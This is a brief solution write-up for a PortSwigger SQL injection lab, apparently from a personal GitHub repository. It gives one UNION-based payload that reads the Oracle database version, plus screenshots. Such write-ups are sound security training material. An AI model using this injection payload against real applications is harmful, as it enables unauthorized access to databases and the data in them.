## Lab Description
![image](https://github.com/rahulr98/Portswigger_LABs/assets/116432525/927f9c0c-eb80-4496-89e3-44d62236418e)

### Solution

Use the following payload to display the database version:

`'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`

![1](https://github.com/rahulr98/Portswigger_LABs/assets/116432525/06fc2839-a5c9-4751-92df-7e6b121c452e)

The database version is displayed.

![2](https://github.com/rahulr98/Portswigger_LABs/assets/116432525/2c01ed70-7ae4-4a69-b149-c46cc5c9a39e)

![3](https://github.com/rahulr98/Portswigger_LABs/assets/116432525/381ddf0b-16e5-4504-bbc4-582570b926f2)
